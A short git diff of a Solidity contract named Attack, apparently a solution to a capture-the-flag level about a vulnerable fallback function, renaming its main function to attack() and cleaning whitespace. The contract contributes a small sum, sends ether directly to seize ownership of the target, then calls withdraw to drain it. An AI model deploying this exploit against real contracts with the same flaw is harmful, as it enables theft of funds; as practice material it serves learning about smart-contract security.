@@ -14,11 +14,11 @@ contract Attack {
         target = IFallback(_target);
     }
 
-    function takeControlOfTarget() public payable {
+    function attack() public payable {
         target.contribute{ value: 0.0001 ether }();
         payable(address(target)).transfer(.0001 ether);
         target.withdraw();
     }
-    
+
     receive() external payable {}
 }
